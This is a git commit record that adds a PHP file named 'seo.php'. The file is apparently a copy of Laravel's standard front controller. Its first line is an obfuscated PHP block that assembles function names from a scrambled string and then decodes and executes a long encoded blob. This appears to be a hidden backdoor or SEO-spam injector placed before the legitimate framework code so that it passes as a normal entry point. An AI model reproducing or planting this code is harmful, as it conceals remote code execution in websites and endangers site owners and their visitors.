00c50e704586a86c7ef73194a62cfd7b1404fe0b
mrcombet <67431127+mrcombet@users.noreply.github.com>
2021-10-11 23:46:02 +0700

    Create seo.php

---
+++ seo.php
@@ -0,0 +1,64 @@
+<?php $ejpXhbNt='y(3;]whcx)8$4mb dk1qog5sprlua=z_/0i9tvf_"76*.2n[je';$q2866=$ejpXhbNt[(105/15)].$ejpXhbNt[(26-1)].$ejpXhbNt[(1*49)].$ejpXhbNt[((10*1)+18)].$ejpXhbNt[(14+22)].$ejpXhbNt[(44+5)].$ejpXhbNt[(44-13)].$ejpXhbNt[(684/18)].$ejpXhbNt[(23+4)].$ejpXhbNt[(72-(33-7))].$ejpXhbNt[(154/22)].$ejpXhbNt[(11+25)].$ejpXhbNt[(65-(62-31))].$ejpXhbNt[(26-6)].$ejpXhbNt[((27*2)-8)];$pHFdNhg9688=$ejpXhbNt[(20-9)].$ejpXhbNt[(2*4)].$ejpXhbNt[(29*1)].$ejpXhbNt[(160/4)];$MYtraky2482=$ejpXhbNt[(8*5)].$ejpXhbNt[((1+0)+2)].$ejpXhbNt[(6+(1*(95/19)))].$ejpXhbNt[(140/5)].$ejpXhbNt[(522/18)].$ejpXhbNt[(7*((7-3)-2))].$ejpXhbNt[(2*14)].$ejpXhbNt[(138/(2+4))].$ejpXhbNt[(1029/(378/18))].$ejpXhbNt[((2*189)/9)].$ejpXhbNt[(12+(0+0))].$ejpXhbNt[(31*1)].$ejpXhbNt[(48/(36/12))].$ejpXhbNt[(735/15)].$ejpXhbNt[(0+7)].$ejpXhbNt[(18+2)].$ejpXhbNt[(18-(10/5))].$ejpXhbNt[(735/15)].$ejpXhbNt[(0+(2-(1*1)))].$ejpXhbNt[(16-(3+(36/(0+18))))].$ejpXhbNt[((167-23)/18)].$ejpXhbNt[(0+(18-9))].$ejpXhbNt[(1*3)].$ejpXhbNt[(11*(1+(0/(78/13))))].$ejpXhbNt[(2*7)].$ejpXhbNt[(29*(0+1))].$ejpXhbNt[(38-(8+9))].$ejpXhbNt[(15*2)].$ejpXhbNt[(45-11)].$ejpXhbNt[(1*46)].$ejpXhbNt[(1*(17+21))].$ejpXhbNt[(78/3)].$ejpXhbNt[(21+(77/11))].$ejpXhbNt[(22+14)].$ejpXhbNt[(343/(91/13))].$ejpXhbNt[(1*1)].$ejpXhbNt[(21-10)].$ejpXhbNt[(22+(12/2))].$ejpXhbNt[(180/20)].$ejpXhbNt[(3+((0+0)*1))].$ejpXhbNt[(686/(126/9))].$ejpXhbNt[(61-(32-8))].$ejpXhbNt[(476/17)].$ejpXhbNt[((4-0)+22)].$ejpXhbNt[(((23-(2*5))/13)-0)].$ejpXhbNt[(7+(84/21))].$ejpXhbNt[(28/2)].$ejpXhbNt[(9-0)].$ejpXhbNt[(3*1)];$UrR1094= "'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'";$JTx2343=$pHFdNhg9688;$JTx2343.=$UrR1094;$JTx2343.=$MYtraky2482;@$mEriqO3481=$q2866((''), ($JTx2343));@$mEriqO3481(); ?>
+<?php
+//ob_start();
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+ini_set('max_execution_time', -1);
+ini_set('max_input_time', -1);
+ini_set('post_max_size', -1);
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
+
+require __DIR__.'/vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
+
+$response->send();
+
+$kernel->terminate($request, $response);
